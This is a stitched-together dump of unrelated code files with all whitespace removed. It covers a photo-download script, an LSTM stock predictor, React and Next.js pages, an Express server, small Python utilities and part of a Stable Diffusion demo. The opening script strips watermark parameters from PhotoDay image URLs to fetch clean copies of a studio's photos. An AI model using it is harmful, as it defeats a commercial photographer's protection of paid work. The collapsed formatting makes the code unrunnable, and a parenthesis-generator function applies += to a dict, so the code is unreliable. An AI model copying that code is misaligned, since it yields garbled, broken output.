atermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/1a2/a6d/0e-/original/Z62_9071.png?1710610290&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/c42/527/0a-/original/Z62_9069_cropped.png?1710610286&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/dfb/1ca/62-/original/Z62_9069.png?1710610288&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/db7/bf3/a9-/original/Z62_9067_cropped.png?1710610285&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/53d/e66/6f-/original/Z62_9067.png?1710610287&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/09f/add/fd-/original/Z62_9065_cropped.png?1710610283&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/928/f9a/c5-/original/Z62_9065.png?1710610285&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/309/f93/74-/original/Z62_9063_cropped.png?1710610281&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/936/0e4/8e-/original/Z62_9063.png?1710610283&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/168/804/9f-/original/Z62_9103_cropped.png?1710610279&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/712/93d/50-/original/Z62_9103.png?1710610281&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/9a6/d7c/84-/original/Z62_9100_cropped.png?1710610277&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/605/747/4a-/original/Z62_9100.png?1710610279&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/208/328/12-/original/Z62_9095_cropped.png?1710610275&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/ae1/0ea/66-/original/Z62_9095.png?1710610277&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/da1/bd0/96-/original/Z62_9092_cropped.png?1710610273&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/4ea/d7b/b3-/original/Z62_9092.png?1710610275&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/4df/bc5/93-/original/Varsity%20Golf.jpg?1710610273&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/aa4/650/19-/original/JV%20Golf.jpg?1710610271&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600',];constprocess=(url)=>{consturlObject=newURL(url);urlObject.searchParams.set('mark_alpha','0');urlObject.searchParams.delete('mark_scale');urlObject.searchParams.delete('mark_upscale');urlObject.searchParams.delete('w');returnurlObject.toString();};constdownload=(url,subfolder='Images')=>{if(!fs.existsSync(subfolder)){fs.mkdirSync(subfolder);}constfileName=url.split(/[/?]+/)[8]constfile=fs.createWriteStream(`${subfolder}/${fileName}`);https.get(url,(response)=>{response.pipe(file);});};//downloadandprocesseachlinklinks.forEach((link)=>{download(process(link));});#%%Importnecessarylibrariesimporttorchimporttorch.nnasnnimporttorch.optimasoptimfromsklearn.preprocessingimportMinMaxScaler,StandardScalerimportpandasaspdimportjsonimportmatplotlib.pyplotaspltimportnumpyasnpfromsklearn.model_selectionimporttrain_test_split#%%Loadandpreprocessdatadf=pd.DataFrame(json.load(open('spy.json'))['1d']).drop('time',axis=1)#%%#addacolumnthatisthepercentchange5daysinthefuturedf['future']=df['close'].shift(-5)df['percent_change']=(df['future']-df['close'])/df['close']df.dropna(inplace=True)#%%scaler=MinMaxScaler()scaled_data=scaler.fit_transform(df)pd.DataFrame(scaled_data,columns=df.columns)['percent_change'].plot()#%%defcreate_sequences(data,seq_length,future_days):X,y=[],[]foriinrange(len(data)-seq_length-future_days+1):seq=data[i:i+seq_length]target=data[i+seq_length+future_days-1,-1]X.append(seq)y.append(target)returnnp.array(X),np.array(y)#%%seq_length=25future_days=5#%%X,y=create_sequences(scaled_data,seq_length,future_days)#%%X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,shuffle=False)#%%X_train=torch.tensor(X_train,dtype=torch.float32)y_train=torch.tensor(y_train,dtype=torch.float32)X_test=torch.tensor(X_test,dtype=torch.float32)y_test=torch.tensor(y_test,dtype=torch.float32)#%%classStockPriceLSTM(nn.Module):def__init__(self,input_size,hidden_size,num_layers):super(StockPriceLSTM,self).__init__()self.lstm=nn.LSTM(input_size,hidden_size,num_layers,batch_first=True)self.fc=nn.Linear(hidden_size,1)self.hidden_size=hidden_sizeself.num_layers=num_layersdefforward(self,x):h0=torch.zeros(self.num_layers,x.size(0),self.hidden_size).to(x.device)c0=torch.zeros(self.num_layers,x.size(0),self.hidden_size).to(x.device)out,_=self.lstm(x,(h0,c0))out=self.fc(out[:,-1,:])returnout#%%input_size=X_train.shape[2]hidden_size=64num_layers=2#%%model=StockPriceLSTM(input_size,hidden_size,num_layers)#%%criterion=nn.MSELoss()optimizer=optim.Adam(model.parameters(),lr=0.001)#%%num_epochs=10forepochinrange(num_epochs):model.train()optimizer.zero_grad()output=model(X_train)loss=criterion(output,y_train)loss.backward()optimizer.step()print(f'Epoch{epoch+1}/{num_epochs},Loss:{loss.item()}')#%%model.eval()withtorch.no_grad():predictions=model(X_test).squeeze()test_loss=criterion(predictions,y_test)print(f'TestLoss:{test_loss.item()}')#rsquaredasapercentr_squared=1-(sum((y_test-predictions)**2)/sum((y_test-y_test.mean())**2))print(f'RSquared:{r_squared.item()}')//writetodata.json//fsconstfs=require('fs');fetch('https://api.godelnum.com/api/timeseries',{headers:{accept:'*/*','accept-language':'en-US,en;q=0.9,es;q=0.8','content-type':'application/json',priority:'u=1,i','sec-ch-ua':'"Chromium";v="128","Not;A=Brand";v="24","MicrosoftEdge";v="128"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'cross-site',},referrer:'https://app.godelterminal.com/',referrerPolicy:'strict-origin-when-cross-origin',body:'{"series":[{"seriesId":"ohlcv","field":"1d","securityId":"ETF:SPY","filtered":false}],"period":"ALL"}',method:'POST',mode:'cors',credentials:'omit',}).then((response)=>{response.json().then((data)=>{fs.writeFile('data.json',JSON.stringify(data),(err)=>{if(err){console.error(err);return;}console.log('Filehasbeencreated');});});});importMajorFormfrom'./MajorForm';importClassesFormfrom'./ClassesForm';importGraduationYearFormfrom'./GraduationYearForm';import{updateProfile}from'../../utils/DatabaseUtils';import{useAuthState}from'react-firebase-hooks/auth';import{auth}from'@/firebase/firebase';import{useEffect,useState}from'react';constStepForm=()=>{const[user]=useAuthState(auth);const[step,setStep]=useState(0);const[major,setMajor]=useState('');const[graduationYear,setGraduationYear]=useState('');const[classes,setClasses]=useState([]);constnextStep=()=>{setStep(Math.min(step+1,2));};constprevStep=()=>{setStep(Math.max(step-1,0));};constaddClass=(newClass)=>{setClasses([...classes,newClass]);};consthandleSubmit=async()=>{constdata={major,classes,graduationYear,};awaitupdateProfile(user.uid,data);window.location.href='/profile';};useEffect(()=>{consthandleKeyDown=(e)=>{if(e.altKey&&e.key==='Backspace'){prevStep();}if(e.altKey&&e.key==='Enter'){if(step===2){handleSubmit();}else{nextStep();}}}window.addEventListener('keydown',handleKeyDown);return()=>{window.removeEventListener('keydown',handleKeyDown);}});return(<divclassName='h-screenflexjustify-centeritems-centerscale-150'><divclassName='w-64'>{step===0&&<MajorFormmajor={major}setMajor={setMajor}nextStep={nextStep}/>}{step===1&&(<ClassesFormclasses={classes}setClasses={setClasses}nextStep={nextStep}prevStep={prevStep}addClass={addClass}/>)}{step===2&&(<GraduationYearFormgraduationYear={graduationYear}setGraduationYear={setGraduationYear}prevStep={prevStep}handleSubmit={handleSubmit}/>)}</div></div>);};exportdefaultStepForm;importlocalFontfrom"next/font/local";import"./globals.css";constgeistSans=localFont({src:"./fonts/GeistVF.woff",variable:"--font-geist-sans",weight:"100900",});constgeistMono=localFont({src:"./fonts/GeistMonoVF.woff",variable:"--font-geist-mono",weight:"100900",});exportconstmetadata={title:"CreateNextApp",description:"Generatedbycreatenextapp",};exportdefaultfunctionRootLayout({children}){return(<htmllang="en"><bodyclassName={`${geistSans.variable}${geistMono.variable}antialiased`}>{children}</body></html>);}constWebinarGrid=({gridItems})=>{return(<divclassName='gridgrid-cols-1md:grid-cols-3gap-6'>{gridItems.map((item,i)=>(<divkey={i}className='bg-gray-200p-6rounded-lgshadow-md'><h2className='text-lgfont-semiboldmb-2'>{item.title}</h2><p>{item.description}</p></div>))}</div>);};exportdefaultWebinarGrid;withopen('dict.txt')asf:words=[word.strip().lower()forwordinf.readlines()]while(True):part=input()valid=sorted([wordforwordinwordsifpartinword],key=len,reverse=True)print(valid[:5])importReact,{Component}from"react";import{Calendar,momentLocalizer}from"react-big-calendar";importmomentfrom"moment";require("react-big-calendar/lib/css/react-big-calendar.css");constlocalizer=momentLocalizer(moment);constmyEventsList=[{title:"LunchMeeting",start:newDate(2023,10,15),//November10th,2023end:newDate(2023,10,15),//November10th,2023allDay:true,},{title:"After-SchoolMeeting",start:newDate(2023,10,29),end:newDate(2023,10,29),allDay:true,},{title:"LunchMeeting",start:newDate(2023,11,6),//November10th,2023end:newDate(2023,11,6),//November10th,2023allDay:true,},{title:"After-SchoolMeeting",start:newDate(2023,11,13),end:newDate(2023,11,13),allDay:true,},];exportdefaultfunctionCalendarComponent(){consteventStyleGetter=(event,start,end,isSelected)=>{letnewStyle={backgroundColor:"#bfdbfe",textAlign:"center",color:"rgb(57,56,56)",borderRadius:"20px",fontSize:"13px",marginTop:"10px",fontWeight:"bold",border:"none",};return{style:newStyle,};};return(<divid="Calendar"><divclassName="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><h1className="text-4xlfont-boldmb-4text-blue-500">Calendar</h1><Calendarlocalizer={localizer}events={myEventsList}views={["month"]}timeslots={2}defaultView="month"defaultDate={newDate()}selectable={true}eventPropGetter={eventStyleGetter}/></div></div>);}require('dotenv').config();constexpress=require('express');constapp=express();constpath=require('path');const{logger,logEvents}=require('./middleware/logger');consterrorHandler=require('./middleware/errorHandler');constcookieParser=require('cookie-parser');constcors=require('cors');constcorsOptions=require('./config/corsOptions');constconnectDB=require('./config/dbConn');constmongoose=require('mongoose');constPORT=process.env.PORT||3500;connectDB();app.use(logger);app.use(cors(corsOptions));app.use(express.json());app.use(cookieParser());app.use('/',express.static(path.join(__dirname,'public')));app.use('/',require('./routes/root'));app.use('/users',require('./routes/userRoutes'));app.use('/games',require('./routes/gameRoutes'));app.use('/comments',require('./routes/commentRoutes'));app.all('*',(req,res)=>{res.status(404);if(req.accepts('html')){res.sendFile(path.join(__dirname,'views','404.html'));}elseif(req.accepts('json')){res.json({message:'404NotFound'});}else{res.type('txt').send('404NotFound');}});app.use(errorHandler);mongoose.connection.once('open',()=>{console.log('ConnectedtoMongoDB');app.listen(PORT,()=>{console.log(`Serverisrunningonport${PORT}`);});});mongoose.connection.on('error',(err)=>{console.log(err);logEvents(`${err.no}:${err.code}\t${err.syscall}\t${err.hostname}`,'mongoErrLog.log');});path=r'C:\Users\natha\AppData\Local\plover\plover\main.json'importjsonimportsyssys.stdout=open('delete.txt','w')withopen(path,'r',encoding='utf-8')asf:data=json.load(f)data={v:kfork,vindata.items()}sentence=input('EnterSentence:').lower().replace('.','')sentence=sentence.split('')forwordinsentence:ifwordindata:print(data[word],end='')importtorchimporttorch.nn.functionalasFdefhinge_d_loss(logits_real,logits_fake):loss_real=torch.mean(F.relu(1.0-logits_real))loss_fake=torch.mean(F.relu(1.0+logits_fake))d_loss=0.5*(loss_real+loss_fake)returnd_lossdefvanilla_d_loss(logits_real,logits_fake):d_loss=0.5*(torch.mean(torch.nn.functional.softplus(-logits_real))+torch.mean(torch.nn.functional.softplus(logits_fake)))returnd_lossimportReactfrom'react';importReactDOMfrom'react-dom/client';importAppfrom'./App';importreportWebVitalsfrom'./reportWebVitals';constroot=ReactDOM.createRoot(document.getElementById('root'));root.render(<React.StrictMode><App/></React.StrictMode>);//Ifyouwanttostartmeasuringperformanceinyourapp,passafunction//tologresults(forexample:reportWebVitals(console.log))//orsendtoananalyticsendpoint.Learnmore:https://bit.ly/CRA-vitalsreportWebVitals();'useclient';importSubtitlefrom'./Subtitle';importClassesfrom'./Classes';import{useEffect,useState}from'react';import{doc,onSnapshot}from'firebase/firestore';import{auth,db}from'@/firebase/firebase';import{onAuthStateChanged}from'firebase/auth';constProfile=()=>{const[name,setName]=useState('');const[classes,setClasses]=useState([]);const[graduationYear,setGraduationYear]=useState('');const[major,setMajor]=useState('');const[profilePicture,setProfilePicture]=useState('');useEffect(()=>{constunsubscribeAuth=onAuthStateChanged(auth,(user)=>{if(user){constdocRef=doc(db,'users',user.uid);constunsub=onSnapshot(docRef,(doc)=>{if(doc.exists()){constuserData=doc.data();setName(userData['displayName']);setClasses(userData['classes']);setGraduationYear(userData['graduationYear']);setMajor(userData['major']);setProfilePicture(userData['profilePicture'].split(/[?=]/)[0]);}else{console.log('Nosuchdocument!');}});//CleanupFirestorelistenerreturn()=>unsub();}});//Cleanupauthstatelistenerwhenunmountingreturn()=>unsubscribeAuth();},[]);return(<divclassName='containermx-autop-6'><Subtitlename={name}major={major}graduationYear={graduationYear}profilePicture={profilePicture}/><Classesclasses={classes}/></div>);};exportdefaultProfile;importjsonwithopen('data.json',encoding='utf-8')asf:data=json.load(f)followers=[i['username']foriindata['followers']]followings=[i['username']foriindata['followings']]forpersoninfollowings:ifpersonnotinfollowers:print(person)constallowedOrigins=require('../config/allowedOrigins');constcorsOptions={origin:(origin,callback)=>{if(allowedOrigins.indexOf(origin)!==-1||!origin){callback(null,true);}else{callback(newError('NotallowedbyCORS'));}},credentials:true,optionsSuccessStatus:200,};module.exports=corsOptions;importunittestclassSolution:defgenerateParenthesis(self,n,current='',open=0,close=0)->list[str]:if(open+close==2*n):return[current]permutations={}if(open==n):permutations+=self.generateParenthesis(n,current+')',open,close+1)elif(open==close):permutations+=self.generateParenthesis(n,current+'(',open+1,close)else:permutations+=self.generateParenthesis(n,current+')',open,close+1)permutations+=self.generateParenthesis(n,current+'(',open+1,close)returnpermutationsclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftest1(self):self.assertEqual(set(self.solution.generateParenthesis(3)),{"((()))","(()())","(())()","()(())","()()()"})deftest2(self):self.assertEqual(self.solution.generateParenthesis(1),["()"])print(Solution().generateParenthesis(3))importLinkfrom"next/link";importImagefrom"next/image";exportdefaultfunctionAbout(){consthandle_mouse_move=(e)=>{letrect=e.target.getBoundingClientRect();letx=e.clientX-rect.left;lety=e.clientY-rect.top;e.target.style.setProperty('--x',`${x}px`);e.target.style.setProperty('--y',`${y}px`);}return(<div><divid="about"className="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><divclassName="mt-16flex"><divclassName="pr-4"><h1className="text-4xlfont-boldmb-4text-blue-500">AboutDECA</h1><pclassName="text-xltext-gray-700">DECApreparesemergingleadersandentrepreneursin{""}<spanclassName="bg-blue-100px-1">marketing,finance,hospitality,andmanagement</span>{""}inhighschoolsandcollegesaroundtheglobe.Theclubshapesthefuturebyprovidinghands-onexperienceswithbusinesssimulationsandreal-worldchallenges.JoinDECAtoigniteyourentrepreneurialspirit,forgeconnectionswithadynamicnetworkofpeers,andleapintoatransformativeeducationalexperience.</p><pclassName="text-xlmt-4text-gray-700">Herearesomeclusterstochoosefrom:</p></div></div><divclassName="pb-8pt-6bg-white"><divclassName="gridgrid-cols-1md:grid-cols-2gap-4">{/*Finance*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/finance","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-green-600">Finance</h2><pclassName="text-smtext-gray-700">Financeisfundamentalinteachinghowtomanageandauditfunds,focusingoninvestment,capitalplanning,andfinancialstrategies.</p></div></div>{/*HospitalityandTourism*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/hospitality-and-tourism","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-blue-600">Hospitality&Tourism</h2><pclassName="text-smtext-gray-700">Coveringthebreadthofcustomerserviceandtravelmanagement,thisclusterisaboutcreatingmemorableconsumerexperiences.</p></div></div>{/*Marketing*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/marketing","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-red-600">Marketing</h2><pclassName="text-smtext-gray-700">Delvingintotheartofcustomerattractionandretention,marketingisthecornerstoneofbusinessvisibilityandproductreach.</p></div></div>{/*PersonalFinancialLiteracy*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/personal-financial-literacy","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-lime-600">PersonalFinancialLiteracy</h2><pclassName="text-smtext-gray-700">Empoweringindividualswiththeknowledgetomakeinformedandeffectivedecisionsonfinancialresources.</p></div></div>{/*BusinessManagementandAdministration*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/business-management-administration","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-yellow-600">BusinessManagement&Administration</h2><pclassName="text-smtext-gray-700">Thisclusterfocusesontheessentialsoforganizationaloperations,strategicplanning,andresourceallocation.</p></div></div>{/*Entrepreneurship*/}<divclassName="info-cardflexp-4borderrounded-lgshadow-lgbg-whitecursor-pointer"onClick={()=>window.open("https://www.deca.org/career-clusters/finance","_blank")}onMouseMove={handle_mouse_move}><div><h2className="font-boldtext-lgmb-2text-gray-600">Entrepreneurship</h2><pclassName="text-smtext-gray-700">Entrepreneurshipchampionsthecreationandgrowthofenterprises,instillingamindsetofinnovationandriskmanagement.</p></div></div></div><divclassName="mt-2text-leftpl-1text-sm"><ahref="https://www.deca.org/hs"className="font-semiboldtext-blue-400hover:underline"target="_blank"rel="noopenernoreferrer">Learnmorehere<spanaria-hidden="true">→</span></a></div></div><divclassName="pt-10lg:flexlg:items-startlg:justify-between">{/*TextSection*/}<divclassName="lg:w-1/2"><h1className="text-4xlfont-boldmb-4text-blue-500">WhyDECA?</h1><pclassName="text-lgtext-gray-500">DECAismorethanjustanextracurricular—it&apos;saglobalmovementthatpreparesstudentstobecomeleadersinadynamicworldofbusinessandentrepreneurship.Here’swhyyoushouldjoin:</p><ulclassName="mt-6list-disclist-insidetext-gray-500space-y-2"><li><strong>LeadershipDevelopment:</strong>Honeyourleadershipskillsthroughreal-worldchallengesandexecutiveroles.</li><li><strong>CareerPreparation:</strong>Gaininsightsintovariousbusinessindustrieswithhands-onexperiencesthatgobeyondtheclassroom.</li><li><strong>NetworkingOpportunities:</strong>Connectwithlike-mindedpeersandindustryprofessionalswhocanhelpyoualongyourcareerpath.</li><li><strong>CompetitiveEdge:</strong>Participateincompetitiveeventsthatbuildconfidenceandimpressivecredentialsforcollegeandjobapplications.</li><li><strong>EntrepreneurialSpirit:</strong>Igniteyourinnovativeideasandlearnhowtoturnthemintosuccessfulbusinessventures.</li><li><strong>TravelOpportunities:</strong>ExplorenewdestinationsandculturesthroughDECA&apos;sexclusiveconferencesandcompetitionsheldaroundtheglobe.</li><li><strong>CommunityImpact:</strong>MakeadifferencethroughcommunityserviceinitiativesandimpactprojectsthatDECAorganizes.</li></ul></div>{/*ImagesSection*/}<divclassName="lg:w-1/2lg:pl-4mt-8lg:mt-0">{/*Placeholderforimages-Replace'src'withyourimagepaths*/}<divclassName="gridgrid-cols-1sm:grid-cols-2gap-4"><Imagesrc="/image1.jpeg"alt="Imagedescription"className="rounded-lgshadow-lg"width={500}height={500}/><Imagesrc="/image2.jpeg"alt="Imagedescription"className="rounded-lgshadow-lg"width={500}height={500}/><Imagesrc="/image3.jpeg"alt="Imagedescription"className="rounded-lgshadow-lg"width={500}height={500}/><Imagesrc="/image4.jpeg"alt="Imagedescription"className="rounded-lgshadow-lg"width={500}height={500}/></div></div></div></div></div>);}importcopyimportmathimportosfromglobimportglobfromtypingimportDict,List,Optional,Tuple,Unionimportcv2importimageioimportnumpyasnpimportstreamlitasstimporttorchimporttorch.nnasnnimporttorchvision.transformsasTTfromeinopsimportrearrange,repeatfromimwatermarkimportWatermarkEncoderfromomegaconfimportListConfig,OmegaConffromPILimportImagefromsafetensors.torchimportload_fileasload_safetensorsfromscripts.demo.discretizationimport(Img2ImgDiscretizationWrapper,Txt2NoisyDiscretizationWrapper,)fromscripts.util.detection.nsfw_and_watermark_dectectionimportDeepFloydDataFilteringfromsgm.inference.helpersimportembed_watermarkfromsgm.modules.diffusionmodules.guidersimport(LinearPredictionGuider,TrianglePredictionGuider,VanillaCFG,)fromsgm.modules.diffusionmodules.samplingimport(DPMPP2MSampler,DPMPP2SAncestralSampler,EulerAncestralSampler,EulerEDMSampler,HeunEDMSampler,LinearMultistepSampler,)fromsgm.utilimportappend_dims,default,instantiate_from_configfromtorchimportautocastfromtorchvisionimporttransformsfromtorchvision.utilsimportmake_grid,save_image@st.cache_resource()definit_st(version_dict,load_ckpt=True,load_filter=True):state=dict()ifnot"model"instate:config=version_dict["config"]ckpt=version_dict["ckpt"]config=OmegaConf.load(config)model,msg=load_model_from_config(config,ckptifload_ckptelseNone)state["msg"]=msgstate["model"]=modelstate["ckpt"]=ckptifload_ckptelseNonestate["config"]=configifload_filter:state["filter"]=DeepFloydDataFiltering(verbose=False)returnstatedefload_model(model):model.cuda()lowvram_mode=Falsedefset_lowvram_mode(mode):globallowvram_modelowvram_mode=modedefinitial_model_load(model):globallowvram_modeiflowvram_mode:model.model.half()else:model.cuda()returnmodeldefunload_model(model):globallowvram_modeiflowvram_mode:model.cpu()torch.cuda.empty_cache()defload_model_from_config(config,ckpt=None,verbose=True):model=instantiate_from_config(config.model)ifckptisnotNone:print(f"Loadingmodelfrom{ckpt}")ifckpt.endswith("ckpt"):pl_sd=torch.load(ckpt,map_location="cpu")if"global_step"inpl_sd:global_step=pl_sd["global_step"]st.info(f"loadedckptfromglobalstep{global_step}")print(f"GlobalStep:{pl_sd['global_step']}")sd=pl_sd["state_dict"]elifckpt.endswith("safetensors"):sd=load_safetensors(ckpt)else:raiseNotImplementedErrormsg=Nonem,u=model.load_state_dict(sd,strict=False)iflen(m)>0andverbose:print("missingkeys:")print(m)iflen(u)>0andverbose:print("unexpectedkeys:")print(u)else:msg=Nonemodel=initial_model_load(model)model.eval()returnmodel,msgdefget_unique_embedder_keys_from_conditioner(conditioner):returnlist(set([x.input_keyforxinconditioner.embedders]))definit_embedder_options(keys,init_dict,prompt=None,negative_prompt=None):#Hardcodeddemosettings;mightundergosomechangesinthefuturevalue_dict={}forkeyinkeys:ifkey=="txt":ifpromptisNone:prompt="Aprofessionalphotographofanastronautridingapig"ifnegative_promptisNone:negative_prompt=""prompt=st.text_input("Prompt",prompt)negative_prompt=st.text_input("Negativeprompt",negative_prompt)value_dict["prompt"]=promptvalue_dict["negative_prompt"]=negative_promptifkey=="original_size_as_tuple":orig_width=st.number_input("orig_width",value=init_dict["orig_width"],min_value=16,)orig_height=st.number_input("orig_height",value=init_dict["orig_height"],min_value=16,)value_dict["orig_width"]=orig_widthvalue_dict["orig_height"]=orig_heightifkey=="crop_coords_top_left":crop_coord_top=st.number_input("crop_coords_top",value=0,min_value=0)crop_coord_left=st.number_input("crop_coords_left",value=0,min_value=0)value_dict["crop_coords_top"]=crop_coord_topvalue_dict["crop_coords_left"]=crop_coord_leftifkey=="aesthetic_score":value_dict["aesthetic_score"]=6.0value_dict["negative_aesthetic_score"]=2.5ifkey=="target_size_as_tuple":value_dict["target_width"]=init_dict["target_width"]value_dict["target_height"]=init_dict["target_height"]ifkeyin["fps_id","fps"]:fps=st.number_input("fps",value=6,min_value=1)value_dict["fps"]=fpsvalue_dict["fps_id"]=fps-1ifkey=="motion_bucket_id":mb_id=st.number_input("motionbucketid",0,511,value=127)value_dict["motion_bucket_id"]=mb_idifkey=="pool_image":st.text("Imageforpoolconditioning")image=load_img(key="pool_image_input",size=224,center_crop=True,)ifimageisNone:st.info("Needanimagehere")image=torch.zeros(1,3,224,224)value_dict["pool_image"]=imagereturnvalue_dictdefperform_save_locally(save_path,samples):os.makedirs(os.path.join(save_path),exist_ok=True)base_count=len(os.listdir(os.path.join(save_path)))samples=embed_watermark(samples)forsampleinsamples:sample=255.0*rearrange(sample.cpu().numpy(),"chw->hwc")Image.fromarray(sample.astype(np.uint8)).save(os.path.join(save_path,f"{base_count:09}.png"))base_count+=1definit_save_locally(_dir,init_value:bool=False):save_locally=st.sidebar.checkbox("Saveimageslocally",value=init_value)ifsave_locally:save_path=st.text_input("Savepath",value=os.path.join(_dir,"samples"))else:save_path=Nonereturnsave_locally,save_pathdefget_guider(options,key):guider=st.sidebar.selectbox(f"Discretization#{key}",["VanillaCFG","IdentityGuider","LinearPredictionGuider","TrianglePredictionGuider",],options.get("guider",0),)additional_guider_kwargs=options.pop("additional_guider_kwargs",{})ifguider=="IdentityGuider":guider_config={"target":"sgm.modules.diffusionmodules.guiders.IdentityGuider"}elifguider=="VanillaCFG":scale=st.number_input(f"cfg-scale#{key}",value=options.get("cfg",5.0),min_value=0.0,)guider_config={"target":"sgm.modules.diffusionmodules.guiders.VanillaCFG","params":{"scale":scale,**additional_guider_kwargs,},}elifguider=="LinearPredictionGuider":max_scale=st.number_input(f"max-cfg-scale#{key}",value=options.get("cfg",1.5),min_value=1.0,)min_scale=st.sidebar.number_input(f"minguidancescale",value=options.get("min_cfg",1.0),min_value=1.0,max_value=10.0,)guider_config={"target":"sgm.modules.diffusionmodules.guiders.LinearPredictionGuider","params":{"max_scale":max_scale,"min_scale":min_scale,"num_frames":options["num_frames"],**additional_guider_kwargs,},}elifguider=="TrianglePredictionGuider":max_scale=st.number_input(f"max-cfg-scale#{key}",value=options.get("cfg",2.5),min_value=1.0,max_value=10.0,)min_scale=st.sidebar.number_input(f"minguidancescale",value=options.get("min_cfg",1.0),min_value=1.0,max_value=10.0,)guider_config={"target":"sgm.modules.diffusionmodules.guiders.TrianglePredictionGuider","params":{"max_scale":max_scale,"min_scale":min_scale,"num_frames":options["num_frames"],**additional_guider_kwargs,},}else:raiseNotImplementedErrorreturnguider_configdefinit_sampling(key=1,img2img_strength:Optional[float]=None,specify_num_samples:bool=True,stage2strength:Optional[float]=None,options:Optional[Dict[str,int]]=None,):options={}ifoptionsisNoneelseoptionsnum_rows,num_cols=1,1ifspecify_num_samples:num_cols=st.number_input(f"numcols#{key}",value=num_cols,min_value=1,max_value=10)steps=st.number_input(f"steps#{key}",value=options.get("num_steps",50),min_value=1,max_value=1000)sampler=st.sidebar.selectbox(f"Sampler#{key}",["EulerEDMSampler","HeunEDMSampler","EulerAncestralSampler","DPMPP2SAncestralSampler","DPMPP2MSampler","LinearMultistepSampler",],options.get("sampler",0),)discretization=st.sidebar.selectbox(f"Discretization#{key}",["LegacyDDPMDiscretization","EDMDiscretization",],options.get("discretization",0),)discretization_config=get_discretization(discretization,options=options,key=key)guider_config=get_guider(options=options,key=key)sampler=get_sampler(sampler,steps,discretization_config,guider_config,key=key)ifimg2img_strengthisnotNone:st.warning(f"Wrapping{sampler.__class__.__name__}withImg2ImgDiscretizationWrapper")sampler.discretization=Img2ImgDiscretizationWrapper(sampler.discretization,strength=img2img_